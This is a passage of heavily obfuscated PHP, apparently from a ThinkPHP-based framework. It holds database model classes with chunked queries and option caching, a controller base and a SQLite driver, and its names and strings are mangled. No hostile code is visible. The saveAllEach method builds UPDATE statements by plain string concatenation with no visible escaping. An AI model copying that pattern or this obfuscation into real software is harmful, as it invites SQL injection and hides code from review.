"\x20\127\110\x45\116\40\47{$á®‹Ìì‰[1]}\47\x20\x54\110\x45\x4e\40\47{$á®‹Ìì‰[3]}\x27\40\xa"; if ($ûÇ¶º‰Ú == $à‘ÅàĞí || $Ò®‘È«å == $âò³ƒ - 1) { $‚‘ş¥—€ = implode($åÔ˜Œ‚[50], $ê‘³ôÚ‚); $˜ºˆ›ÚÏ .= "\x20\105\116\104\40\x20\x57\x48\x45\x52\105\x20{$á®‹Ìì‰[0]}\x20\x49\x4e\40\50{$‚‘ş¥—€}\x29\x20"; $this->execute($˜ºˆ›ÚÏ); $ûÇ¶º‰Ú = 0; $˜ºˆ›ÚÏ = $Ûêò“®ë; $this->chunkEventCheck(count($ê‘³ôÚ‚)); $ê‘³ôÚ‚ = array(); } } $this->chunkEventSet(); } public function saveAllEach($²§‡Ö) { $ó€í¨Ÿ =& $_SERVER[÷ôÚîå]; $Ö¸ºÕÓÇ = $this->tablePrefix . $this->tableName; foreach ($²§‡Ö as $ü†¾÷¸) { if (!is_array($ü†¾÷¸) || count($ü†¾÷¸) != 4) { continue; } $¾ÂŸÒÂœ = $ü†¾÷¸[0] . $ó€í¨Ÿ[464] . $ü†¾÷¸[1] . $ó€í¨Ÿ[131]; $¾°‚‚ãÎ = $ü†¾÷¸[2] . $ó€í¨Ÿ[464] . $ü†¾÷¸[3] . $ó€í¨Ÿ[131]; $²Ãºİú’ = "\165\160\144\x61\x74\145\40{$Ö¸ºÕÓÇ}\x20\x73\x65\164\40{$¾°‚‚ãÎ}\40\167\x68\x65\x72\x65\x20{$¾ÂŸÒÂœ}\73"; $this->execute($²Ãºİú’); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($Êä¾çá¦ = false, $ä”ÏÉÓÒ = false) { $this->_chunkEvent = $Êä¾çá¦; $this->_chunkEventParam = $ä”ÏÉÓÒ; } private function chunkEventCheck($İÖÃïœØ) { if (!$this->_chunkEvent) { return; } $²äƒÜæú = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $²äƒÜæú[$_SERVER[÷ôÚîå][465]] = $İÖÃïœØ; Hook::trigger($this->_chunkEvent, $²äƒÜæú); } public function addAll($°ÆíúßĞ, $±æµøê = array(), $Æ“˜ãœŠ = false) { $òæâø„Ì =& $_SERVER[÷ôÚîå]; ignore_timeout(); $Öî’ÁŞ = self::SQL_WHERE_IN_CHUNK; if (empty($°ÆíúßĞ)) { $this->error = think_lang($òæâø„Ì[357]); return !1; } $±æµøê = $this->_parseOptions($±æµøê); foreach ($°ÆíúßĞ as $Çíçø•á => $‘§‹ú¢) { $°ÆíúßĞ[$Çíçø•á] = $this->_facade($‘§‹ú¢); $this->_beforeInsert($°ÆíúßĞ[$Çíçø•á], $±æµøê); } if (method_exists($this->db, $òæâø„Ì[358])) { for ($ÔÀÑ¬¹· = 0; $ÔÀÑ¬¹· < count($°ÆíúßĞ); $ÔÀÑ¬¹· += $Öî’ÁŞ) { $Ë©Ÿ¨Ê¦ = array_slice($°ÆíúßĞ, $ÔÀÑ¬¹·, $Öî’ÁŞ); if (!is_array($Ë©Ÿ¨Ê¦) || count($Ë©Ÿ¨Ê¦) == 0) { break; } $óÒÛùæ³ = $this->db->insertAll($Ë©Ÿ¨Ê¦, $±æµøê, $Æ“˜ãœŠ); $this->chunkEventCheck(count($Ë©Ÿ¨Ê¦)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($°ÆíúßĞ as $Çíçø•á => $‘§‹ú¢) { $óÒÛùæ³ = $this->db->insert($‘§‹ú¢, $±æµøê, $Æ“˜ãœŠ); } $this->commit(); } if (!1 !== $óÒÛùæ³) { $Š®òºËâ = $this->getLastInsID(); if ($Š®òºËâ) { return $Š®òºËâ; } } return $óÒÛùæ³; } public function save($Ï¹òúìŸ = '', $÷Â¾ÄÂƒ = array()) { $ƒ°ŠÈ…¡ =& $_SERVER[÷ôÚîå]; $¢Ê²¤ß½ = self::SQL_WHERE_IN_CHUNK; $é¬·İËÑ = $this->optionsValue(); $Ç­¥«ö€ = $this->findWhereField($é¬·İËÑ); if (!$Ç­¥«ö€) { return parent::save($Ï¹òúìŸ, $÷Â¾ÄÂƒ); } $Éƒğ‡·¾ = 0; $˜õÆƒû‡ = $é¬·İËÑ[$ƒ°ŠÈ…¡[361]][$Ç­¥«ö€][1]; $˜õÆƒû‡ = is_array($˜õÆƒû‡) ? $˜õÆƒû‡ : array(); $­“ó“ = count($˜õÆƒû‡); for ($…‚Óİû = 0; $…‚Óİû < $­“ó“; $…‚Óİû += $¢Ê²¤ß½) { $“›ÌÆ–Ï = array_slice($˜õÆƒû‡, $…‚Óİû, $¢Ê²¤ß½); if (!is_array($“›ÌÆ–Ï) || count($“›ÌÆ–Ï) == 0) { break; } $é¬·İËÑ[$ƒ°ŠÈ…¡[361]][$Ç­¥«ö€][1] = $“›ÌÆ–Ï; $this->optionsValue($é¬·İËÑ); $Éƒğ‡·¾ += parent::save($Ï¹òúìŸ, $÷Â¾ÄÂƒ); $this->chunkEventCheck(count($“›ÌÆ–Ï)); } $this->chunkEventSet(); return $Éƒğ‡·¾; } public function add($À—¬‹Ä¨ = '', $­¥âæò = array(), $îÇÌƒÒå = false) { if ($this->addTaskStatus && is_array($À—¬‹Ä¨)) { $this->addTaskData[] = $À—¬‹Ä¨; return; } return parent::add($À—¬‹Ä¨, $­¥âæò, $îÇÌƒÒå); } public function parseWhereLike($àŸöçıü, $Ùƒ½şıÚ = '', $ÅıÄÕ„ß = false, &$Í¦‘ÄÖ¼ = false) { $€È«Ãú =& $_SERVER[÷ôÚîå]; $—ÀÛÎß¼ = $GLOBALS[$€È«Ãú[6]][$€È«Ãú[466]]; if (!$—ÀÛÎß¼[$€È«Ãú[467]]) { return $àŸöçıü; } if (!is_array($àŸöçıü)) { return $àŸöçıü; } $—×ÇŠ´ = array(); $ñ–Ñ€ü = 0; foreach ($àŸöçıü as $†í¬”•¥ => $«¸½Ûß) { if (is_array($«¸½Ûß) && count($«¸½Ûß) == 2 && $«¸½Ûß[0] == $€È«Ãú[468] && is_string($«¸½Ûß[1]) && substr($«¸½Ûß[1], 0, 1) == $€È«Ãú[469] && substr($«¸½Ûß[1], strlen($«¸½Ûß[1]) - 1, 1) == $€È«Ãú[469]) { $Í¦‘ÄÖ¼ = !0; $¢ñÇÊú½ = is_string($†í¬”•¥) ? $†í¬”•¥ : $Ùƒ½şıÚ; $İéÚã¡® = substr($«¸½Ûß[1], 1, strlen($«¸½Ûß[1]) - 2); $İéÚã¡® = $this->db->escapeString($İéÚã¡®); if (!strpos($¢ñÇÊú½, $€È«Ãú[10])) { $¢ñÇÊú½ = $€È«Ãú[470] . $¢ñÇÊú½ . $€È«Ãú[470]; } $ÖÊõ‡– = $€È«Ãú[230] . $İéÚã¡® . $€È«Ãú[230]; $İéÚã¡® = str_replace(array($€È«Ãú[10], $€È«Ãú[471], $€È«Ãú[11]), $€È«Ãú[472], $İéÚã¡®); if ($—ÀÛÎß¼[$€È«Ãú[473]]) { $ÖÊõ‡– = $€È«Ãú[474] . $İéÚã¡® . $€È«Ãú[475]; if ($—ÀÛÎß¼[$€È«Ãú[476]]) { $ÖÊõ‡– = $€È«Ãú[475] . $İéÚã¡® . $€È«Ãú[474]; } } $—×ÇŠ´[$ñ–Ñ€ü] = $€È«Ãú[477] . $¢ñÇÊú½ . $€È«Ãú[478] . $ÖÊõ‡– . $€È«Ãú[479]; $ñ–Ñ€ü++; continue; } if (is_array($«¸½Ûß)) { $Ùƒ½şıÚ = is_string($†í¬”•¥) ? $†í¬”•¥ : $Ùƒ½şıÚ; $«¸½Ûß = $this->parseWhereLike($«¸½Ûß, $Ùƒ½şıÚ, !0, $Í¦‘ÄÖ¼); } if (is_numeric($†í¬”•¥)) { $—×ÇŠ´[$ñ–Ñ€ü] = $«¸½Ûß; $ñ–Ñ€ü++; } else { $—×ÇŠ´[$†í¬”•¥] = $«¸½Ûß; } } if ($Í¦‘ÄÖ¼ && !$ÅıÄÕ„ß) { } return $—×ÇŠ´; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($åêØÙ±• = array()) { $ÖĞØ›’£ =& $_SERVER[÷ôÚîå]; $‚Ó¦¤°Ô = self::SQL_WHERE_IN_CHUNK; $ÂÓßÒƒ = $this->optionsValue(); $¾Î¼ó¸ = $this->findWhereField($ÂÓßÒƒ); if (!$¾Î¼ó¸ || isset($ÂÓßÒƒ[$ÖĞØ›’£[377]]) || isset($ÂÓßÒƒ[$ÖĞØ›’£[438]])) { return parent::select($åêØÙ±•); } $šÛ¨ª®Ô = $ÂÓßÒƒ[$ÖĞØ›’£[361]][$¾Î¼ó¸][1]; $šÛ¨ª®Ô = is_array($šÛ¨ª®Ô) ? $šÛ¨ª®Ô : array(); $şÊßÎšÇ = null; for ($–¹ĞÊ–Í = 0; $–¹ĞÊ–Í < count($šÛ¨ª®Ô); $–¹ĞÊ–Í += $‚Ó¦¤°Ô) { $á“ì´‹ı = array_slice($šÛ¨ª®Ô, $–¹ĞÊ–Í, $‚Ó¦¤°Ô); if (!is_array($á“ì´‹ı) || count($á“ì´‹ı) == 0) { break; } $ÂÓßÒƒ[$ÖĞØ›’£[361]][$¾Î¼ó¸][1] = $á“ì´‹ı; $this->optionsValue($ÂÓßÒƒ); $“©°´ŞÎ = parent::select($åêØÙ±•); if (!$“©°´ŞÎ) { continue; } $şÊßÎšÇ = is_array($şÊßÎšÇ) ? $şÊßÎšÇ : array(); $şÊßÎšÇ = array_merge($şÊßÎšÇ, $“©°´ŞÎ); } return $şÊßÎšÇ; } public function delete($¦¥—‡¿È = array()) { $àúİØæÏ =& $_SERVER[÷ôÚîå]; $Í¨º÷ƒà = self::SQL_WHERE_IN_CHUNK; $°©ÉƒÄ¡ = $this->optionsValue(); $úÛ ÃÒº = $this->findWhereField($°©ÉƒÄ¡); if (!$úÛ ÃÒº) { return parent::delete($¦¥—‡¿È); } $Œ›Û¬›” = 0; $…°×âÉÛ = $°©ÉƒÄ¡[$àúİØæÏ[361]][$úÛ ÃÒº][1]; $…°×âÉÛ = is_array($…°×âÉÛ) ? $…°×âÉÛ : array(); for ($Œ–…§¼â = 0; $Œ–…§¼â < count($…°×âÉÛ); $Œ–…§¼â += $Í¨º÷ƒà) { $ÑÎÅŞçô = array_slice($…°×âÉÛ, $Œ–…§¼â, $Í¨º÷ƒà); if (!is_array($ÑÎÅŞçô) || count($ÑÎÅŞçô) == 0) { break; } $°©ÉƒÄ¡[$àúİØæÏ[361]][$úÛ ÃÒº][1] = $ÑÎÅŞçô; $this->optionsValue($°©ÉƒÄ¡); $Œ›Û¬›” += parent::delete($¦¥—‡¿È); } return $Œ›Û¬›”; } private function findWhereField($Îœúª¡) { $¥¯¶¶Ÿ† =& $_SERVER[÷ôÚîå]; $Ãü‡™ü = self::SQL_WHERE_IN_CHUNK; if (!is_array($Îœúª¡) || !is_array($Îœúª¡[$¥¯¶¶Ÿ†[361]])) { return !1; } foreach ($Îœúª¡[$¥¯¶¶Ÿ†[361]] as $®Ò¶š¹½ => $ÓÛÆšŠÜ) { if (is_array($ÓÛÆšŠÜ) && isset($ÓÛÆšŠÜ[0]) && is_string($ÓÛÆšŠÜ[0]) && strtolower($ÓÛÆšŠÜ[0]) == $¥¯¶¶Ÿ†[7] && is_array($ÓÛÆšŠÜ[1]) && count($ÓÛÆšŠÜ[1]) > $Ãü‡™ü) { ignore_timeout(); return $®Ò¶š¹½; } } return !1; } public function setMasterDB($Ì³œú™… = true) { think_config($_SERVER[÷ôÚîå][480], $Ì³œú™…); } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\x79\x73\164\145\155\x4f\x70\164\151\157\x6e"; public $field = array(); public function listData($´áÆŠ¿Ñ = false, $Ø÷óõÒÆ = "\x6d\x6f\x64\x69\146\171\124\151\x6d\x65", $àœúƒÑÊ = false) { $ÊïÙÖÃø = Model($this->modelType)->get(!1, $this->optionType, !0); $¾çä•”² = array_values($ÊïÙÖÃø); if ($¾çä•”² && $¾çä•”²[0] && !is_array($¾çä•”²[0])) { Model($this->modelType)->cacheRemove($this->optionType); $ÊïÙÖÃø = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$ÊïÙÖÃø) { return $´áÆŠ¿Ñ ? null : array(); } if (!$´áÆŠ¿Ñ) { $ÊïÙÖÃø = array_filter(array_values($ÊïÙÖÃø)); return array_sort_by($ÊïÙÖÃø, $Ø÷óõÒÆ, $àœúƒÑÊ); } return $ÊïÙÖÃø[$_SERVER[÷ôÚîå][481] . $´áÆŠ¿Ñ]; } public function insert($ÕÌº°û) { $¡Í¡Ò™µ =& $_SERVER[÷ôÚîå]; $ÕÌº°û = array_field_key($ÕÌº°û, $this->field); $—ü–±Õµ = Model($this->modelType)->get($¡Í¡Ò™µ[482], $this->optionType . $¡Í¡Ò™µ[483]); $—ü–±Õµ = $—ü–±Õµ ? $—ü–±Õµ : 0; $ÕÌº°û[$¡Í¡Ò™µ[484]] = ++$—ü–±Õµ; $ÕÌº°û[$¡Í¡Ò™µ[241]] = time(); $ÕÌº°û[$¡Í¡Ò™µ[98]] = time(); Model($this->modelType)->set($¡Í¡Ò™µ[482], $—ü–±Õµ, $this->optionType . $¡Í¡Ò™µ[483]); Model($this->modelType)->set($¡Í¡Ò™µ[481] . $—ü–±Õµ, $ÕÌº°û, $this->optionType); return $—ü–±Õµ; } public function update($ÛàÜÎ™‡, $ı ˜’·ò) { $¦Ô“½Í¢ =& $_SERVER[÷ôÚîå]; $ı ˜’·ò = array_field_key($ı ˜’·ò, $this->field); $“ßâÂø‘ = $this->listData($ÛàÜÎ™‡); if (!$“ßâÂø‘ || !$ÛàÜÎ™‡) { return !1; } $ı ˜’·ò = array_merge($“ßâÂø‘, $ı ˜’·ò); $ı ˜’·ò[$¦Ô“½Í¢[98]] = time(); return Model($this->modelType)->set($¦Ô“½Í¢[481] . $ÛàÜÎ™‡, $ı ˜’·ò, $this->optionType); } public function remove($¶ğÁ ÜŠ) { if (!$¶ğÁ ÜŠ) { return !1; } return Model($this->modelType)->remove($_SERVER[÷ôÚîå][481] . $¶ğÁ ÜŠ, $this->optionType); } public function clear() { $…¤ë¾“¸ =& $_SERVER[÷ôÚîå]; Model($this->modelType)->remove($…¤ë¾“¸[482], $this->optionType . $…¤ë¾“¸[483]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($á“Ä›Ú¨, $û©ëª–Î) { if (!$û©ëª–Î) { return !1; } $İû¿çóß = $this->listData(); $İû¿çóß = array_to_keyvalue($İû¿çóß, $á“Ä›Ú¨); return isset($İû¿çóß[$û©ëª–Î]) ? $İû¿çóß[$û©ëª–Î] : !1; } public function findByName($Í–ÇĞõ÷) { return $this->findByKey($_SERVER[÷ôÚîå][32], $Í–ÇĞõ÷); } protected function resetData($ØÁüˆ§é) { $ÆÜ©êÖË =& $_SERVER[÷ôÚîå]; $ØÁüˆ§é = is_array($ØÁüˆ§é) ? $ØÁüˆ§é : array(); $˜À€öòë = array(); for ($ÈóƒŸ = 0; $ÈóƒŸ < count($ØÁüˆ§é); $ÈóƒŸ++) { $˜À€öòë[$ÆÜ©êÖË[481] . $ØÁüˆ§é[$ÈóƒŸ][$ÆÜ©êÖË[484]]] = $ØÁüˆ§é[$ÈóƒŸ]; } return Model($this->modelType)->set($˜À€öòë, !1, $this->optionType); } private function getAutoName($ÎÔöÎ¯) { $¯œÃØô = array_to_keyvalue($this->listData(), $_SERVER[÷ôÚîå][32]); if (!$¯œÃØô || !isset($¯œÃØô[$ÎÔöÎ¯])) { return $ÎÔöÎ¯; } for ($åÓ˜™­Ö = 1; $åÓ˜™­Ö < count($¯œÃØô); $åÓ˜™­Ö++) { $İ²÷Æ¾® = $ÎÔöÎ¯ . "\x28{$åÓ˜™­Ö}\x29"; if (!isset($¯œÃØô[$İ²÷Æ¾®])) { return $İ²÷Æ¾®; } } return $İ²÷Æ¾®; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($ĞŞ–¾™ì = false, $å„éÙ«‡ = '', $ã½åó· = false) { $äã«×­´ =& $_SERVER[÷ôÚîå]; $ùíÉõ = $this->cacheGet($å„éÙ«‡); $†•ÕşĞö = $this->optionDefault($å„éÙ«‡); $†•ÕşĞö = is_array($†•ÕşĞö) ? $†•ÕşĞö : array(); if (is_array($ùíÉõ)) { $ùíÉõ = array_merge($†•ÕşĞö, $ùíÉõ); return $ĞŞ–¾™ì ? isset($ùíÉõ[$ĞŞ–¾™ì]) ? $ùíÉõ[$ĞŞ–¾™ì] : null : $ùíÉõ; } $ø ¡Öı‚ = $this->filterWhere(array($äã«×­´[33] => $å„éÙ«‡)); $ùíÉõ = $this->where($ø ¡Öı‚)->select(); $ùíÉõ = array_to_keyvalue($ùíÉõ, $äã«×­´[107], $äã«×­´[459]); foreach ($ùíÉõ as $ˆìÀï => $Ö‚Ë€ğ÷) { if ($ã½åó· || in_array($ˆìÀï, $this->jsonField)) { $ùíÉõ[$ˆìÀï] = json_decode($Ö‚Ë€ğ÷, !0); } } $this->cacheSet($å„éÙ«‡, $ùíÉõ); $ùíÉõ = array_merge($†•ÕşĞö, $ùíÉõ); return $ĞŞ–¾™ì ? $ùíÉõ[$ĞŞ–¾™ì] : $ùíÉõ; } public function set($ª³¢·Ÿå, $³³¹ºƒå = false, $–àº¢¾ = '') { $è‡òÒ¿Ã =& $_SERVER[÷ôÚîå]; $this->cacheRemove($–àº¢¾); $ë¶Ş—í¾ = array(); $ÍÍ½ÕØş = is_array($ª³¢·Ÿå) ? $ª³¢·Ÿå : array($ª³¢·Ÿå => $³³¹ºƒå); foreach ($ÍÍ½ÕØş as $Ÿ—Æäú¨ => $Œ¥ŠË¶¥) { if (is_array($Œ¥ŠË¶¥)) { $Œ¥ŠË¶¥ = json_encode_force($Œ¥ŠË¶¥); } $this->checkLength($Œ¥ŠË¶¥, !1, $this->tableName . $è‡òÒ¿Ã[4] . $ª³¢·Ÿå); $Œ¥ŠË¶¥ = self::textEncode($Œ¥ŠË¶¥); $ÍÍ½ÕØş = array($è‡òÒ¿Ã[33] => $–àº¢¾, $è‡òÒ¿Ã[107] => $Ÿ—Æäú¨, $è‡òÒ¿Ã[459] => $Œ¥ŠË¶¥); $ë¶Ş—í¾[] = $this->filterWhere($ÍÍ½ÕØş); } if (!$ë¶Ş—í¾) { return !0; } $Ø„Ô¶ª = $this->cacheKey($è‡òÒ¿Ã[485]); CacheLock::lock($Ø„Ô¶ª); $ØôÚ—ùì = $this->addAll($ë¶Ş—í¾, array(), !0); CacheLock::unlock($Ø„Ô¶ª); return $ØôÚ—ùì; } protected function optionDefault($ç—Ø§‘– = '') { return !1; } public function setDeep($ó¾ÅÛ¶», $À‹ä Õş = false, $¨öòÖÁË = '') { $í¥”àæü = explode($_SERVER[÷ôÚîå][10], $ó¾ÅÛ¶»); $®èİ´¨Í = $this->get(); array_set_value($®èİ´¨Í, $ó¾ÅÛ¶», $À‹ä Õş); $this->set($í¥”àæü[0], $®èİ´¨Í[$í¥”àæü[0]], $¨öòÖÁË); } public function remove($¨­€Ô»â, $ƒ°¦öù› = '') { $âŸÀÌÈğ =& $_SERVER[÷ôÚîå]; $this->cacheRemove($ƒ°¦öù›); $–»Áí—Ú = $this->filterWhere(array($âŸÀÌÈğ[107] => $¨­€Ô»â, $âŸÀÌÈğ[33] => $ƒ°¦öù›)); if (is_null($¨­€Ô»â)) { unset($–»Áí—Ú[$âŸÀÌÈğ[107]]); } return $this->where($–»Áí—Ú)->delete(); } public function cacheSet($Ğ šçÒŸ, $‰üÛ¿¹ = false) { return Cache::set($this->cacheKey($Ğ šçÒŸ), $‰üÛ¿¹); } public function cacheGet($£×­×¿Å) { return Cache::get($this->cacheKey($£×­×¿Å)); } public function cacheRemove($Ğ¢—êÅµ) { return Cache::remove($this->cacheKey($Ğ¢—êÅµ)); } protected function filterWhere($ÇÑµØ—«) { return $ÇÑµØ—«; } protected function cacheKey($òäºİª‡) { return $òäºİª‡; } } goto f„«ÑªÓèÕ; eğËÇå’¼˜: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $ñíäêÆŞ =& $_SERVER[÷ôÚîå]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$ñíäêÆŞ[6]] =& $config; $this->values[$ñíäêÆŞ[7]] =& $in; $this->tpl = TEMPLATE . MOD . $ñíäêÆŞ[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($âµä³Å) { if (1 === func_num_args()) { $this->{$âµä³Å} = new $âµä³Å(); } else { $•Úè­ìÛ = new ReflectionClass($âµä³Å); $³È‰ËŠŒ = func_get_args(); array_shift($³È‰ËŠŒ); $this->{$âµä³Å} = $•Úè­ìÛ->newInstanceArgs($³È‰ËŠŒ); } return $this->{$âµä³Å}; } public function routeBind($€¶Ö“à‘, $‹ÊÆºˆ, $ö›‚…şº = 3) { $ª”Õëîê =& $_SERVER[÷ôÚîå]; $Ÿ€ÌÄöØ = $this->in[$ª”Õëîê[9]]; $€¶Ö“à‘ = str_replace($ª”Õëîê[10], $ª”Õëîê[11], trim(trim($€¶Ö“à‘, $ª”Õëîê[8]), $ª”Õëîê[12])); if (!$€¶Ö“à‘ || count($Ÿ€ÌÄöØ) <= $ö›‚…şº) { return !1; } $ïÓ²ëª° = !0; $˜£Ç¨ë = explode($ª”Õëîê[8], $€¶Ö“à‘); for ($¾ºß –¨ = 0; $¾ºß –¨ < count($˜£Ç¨ë); $¾ºß –¨++) { if ($˜£Ç¨ë[$¾ºß –¨] != $Ÿ€ÌÄöØ[$ö›‚…şº + $¾ºß –¨]) { $ïÓ²ëª° = !1; break; } } if (!$ïÓ²ëª°) { return; } call_user_func_array(array($this, $‹ÊÆºˆ), array()); } public function routeArgs($Ô‚†®— = 3) { $Şáàí’í = $this->in[$_SERVER[÷ôÚîå][9]]; if (count($Şáàí’í) <= $Ô‚†®—) { return array(); } $ƒ°„ìß» = array(); for ($®è­Ì¾ = $Ô‚†®—; $®è­Ì¾ < count($Şáàí’í); $®è­Ì¾ += 2) { $ƒ°„ìß»[$Şáàí’í[$®è­Ì¾]] = $Şáàí’í[$®è­Ì¾ + 1]; $this->in[$Şáàí’í[$®è­Ì¾]] = $Şáàí’í[$®è­Ì¾ + 1]; } return $ƒ°„ìß»; } protected function assign($ŸËŸÌæó, $ØïÙÜ±”) { $this->values[$ŸËŸÌæó] = $ØïÙÜ±”; } protected function display($ƒş×È©ï) { ob_end_clean(); extract($this->values); require $this->tpl . $ƒş×È©ï; } } class DbSqliteBase extends Db { public function __construct($ıâå¦É = '') { $“ï‡„ãº =& $_SERVER[÷ôÚîå]; if (!extension_loaded($“ï‡„ãº[13])) { think_exception(think_lang($“ï‡„ãº[14]) . $“ï‡„ãº[15]); } if (!empty($ıâå¦É)) { if (!isset($ıâå¦É[$“ï‡„ãº[16]])) { $ıâå¦É[$“ï‡„ãº[16]] = 438; } $this->config = $ıâå¦É; if (empty($this->config[$“ï‡„ãº[17]])) { $this->config[$“ï‡„ãº[17]] = array(); } } } public function connect($µÄÜ³ = '', $ÆÏ»ç±Ô = 0) { $±ıÚââÍ =& $_SERVER[÷ôÚîå]; if (!isset($this->linkID[$ÆÏ»ç±Ô])) { if (empty($µÄÜ³)) { $µÄÜ³ = $this->config; } $®îØ¾ªô = !empty($µÄÜ³[$±ıÚââÍ[17]][$±ıÚââÍ[18]]) ? $µÄÜ³[$±ıÚââÍ[17]][$±ıÚââÍ[18]] : $this->pconnect; $Ö¿™Õ“õ = $®îØ¾ªô ? $±ıÚââÍ[19] : $±ıÚââÍ[20]; $this->linkID[$ÆÏ»ç±Ô] = $Ö¿™Õ“õ($µÄÜ³[$±ıÚââÍ[21]], $µÄÜ³[$±ıÚââÍ[16]]); if (!$this->linkID[$ÆÏ»ç±Ô]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$ÆÏ»ç±Ô], 30000); if (1 != think_config($±ıÚââÍ[22])) { unset($this->config); } } return $this->linkID[$ÆÏ»ç±Ô]; } public function free() { $this->queryID = null; } public function query($àœÒ±ø¥) { $¤Ãæ£ÈÃ =& $_SERVER[÷ôÚîå]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $àœÒ±ø¥; if ($this->queryID) { $this->free(); } think_action_status($¤Ãæ£ÈÃ[23], 1); think_status($¤Ãæ£ÈÃ[24]); $this->queryID = sqlite_query($this->_linkID, $àœÒ±ø¥); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $³™ƒÉ€ˆ = $this->getAll(); return $³™ƒÉ€ˆ; } } public function execute($ôÎß¿´) { $Ü£Ï¬úî =& $_SERVER[÷ôÚîå]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ôÎß¿´; if ($this->queryID) { $this->free(); } think_action_status($Ü£Ï¬úî[25], 1); think_status($Ü£Ï¬úî[24]); $Í”§¬Ö• = sqlite_exec($this->_linkID, $ôÎß¿´); $this->debug(); if (!1 === $Í”§¬Ö•) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[÷ôÚîå][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $¯ªı²«£ = sqlite_query($this->_linkID, $_SERVER[÷ôÚîå][27]); if (!$¯ªı²«£) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $¨ÛúÕÂÕ = sqlite_query($this->_linkID, $_SERVER[÷ôÚîå][28]); if (!$¨ÛúÕÂÕ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $»Ù¬¢ºã = array(); if ($this->numRows > 0) { for ($¸šëÑ¥ì = 0; $¸šëÑ¥ì < $this->numRows; $¸šëÑ¥ì++) { $»Ù¬¢ºã[$¸šëÑ¥ì] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $»Ù¬¢ºã; } public function getFields($€ğí×ñ¡) { $›˜ÒÓŠ× =& $_SERVER[÷ôÚîå]; $è›ÌÄË¼ = $this->query($›˜ÒÓŠ×[29] . $€ğí×ñ¡ . $›˜ÒÓŠ×[30]); $Ï£€¨ö = array(); if ($è›ÌÄË¼) { foreach ($è›ÌÄË¼ as $ŠÕ¢šå => $÷›Ò¹•ì) { $Ï£€¨ö[$÷›Ò¹•ì[$›˜ÒÓŠ×[31]]] = array($›˜ÒÓŠ×[32] => $÷›Ò¹•ì[$›˜ÒÓŠ×[31]], $›˜ÒÓŠ×[33] => $÷›Ò¹•ì[$›˜ÒÓŠ×[34]], $›˜ÒÓŠ×[35] => (bool) ($÷›Ò¹•ì[$›˜ÒÓŠ×[36]] === $›˜ÒÓŠ×[12]), $›˜ÒÓŠ×[37] => $÷›Ò¹•ì[$›˜ÒÓŠ×[38]], $›˜ÒÓŠ×[39] => strtolower($÷›Ò¹•ì[$›˜ÒÓŠ×[40]]) == $›˜ÒÓŠ×[41], $›˜ÒÓŠ×[42] => strtolower($÷›Ò¹•ì[$›˜ÒÓŠ×[43]]) == $›˜ÒÓŠ×[44]); } } return $Ï£€¨ö; } public function getTables($ûÀ‘ÚÌ› = '') { $½Ì„—¦ë =& $_SERVER[÷ôÚîå]; $Æğ½Ïæ¶ = $this->query($½Ì„—¦ë[45] . $½Ì„—¦ë[46] . $½Ì„—¦ë[47]); $ë›ïäÎ– = array(); foreach ($Æğ½Ïæ¶ as $äØ›Î§ñ => $–ÚõíÊ) { $ë›ïäÎ–[$äØ›Î§ñ] = current($–ÚõíÊ); } return $ë›ïäÎ–; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $¬¹Ë±¼ =& $_SERVER[÷ôÚîå]; $›ÖÕöûú = sqlite_last_error($this->_linkID); $this->error = $›ÖÕöûú . $¬¹Ë±¼[4] . sqlite_error_string($›ÖÕöûú); if ($¬¹Ë±¼[12] != $this->queryStr) { $this->error .= LNG($¬¹Ë±¼[48]) . $this->queryStr; } think_trace($this->error, $¬¹Ë±¼[12], $¬¹Ë±¼[49]); return $this->error; } public function escapeString($´Šáœ¸‡) { return sqlite_escape_string($´Šáœ¸‡); } public function parseLimit($ˆ¯â½åË) { $÷™‡² =& $_SERVER[÷ôÚîå]; $‚¤–ïí‹ = $÷™‡²[12]; if (!empty($ˆ¯â½åË)) { $ˆ¯â½åË = explode($÷™‡²[50], $ˆ¯â½åË); if (count($ˆ¯â½åË) > 1) { $‚¤–ïí‹ .= $÷™‡²[51] . $ˆ¯â½åË[1] . $÷™‡²[52] . $ˆ¯â½åË[0] . $÷™‡²[53]; } else { $‚¤–ïí‹ .= $÷™‡²[51] . $ˆ¯â½åË[0] . $÷™‡²[53]; } } return $‚¤–ïí‹; } } class DbSqlite3Base extends Db { public function __construct($ë— š€„ = '') { $°’ã¼Õ =& $_SERVER[÷ôÚîå]; if (!class_exists($°’ã¼Õ[54])) { think_exception(think_lang($°’ã¼Õ[14]) . $°’ã¼Õ[55]); } if (!empty($ë— š€„)) { if (!isset($ë— š€„[$°’ã¼Õ[16]])) { $ë— š€„[$°’ã¼Õ[16]] = 438; } 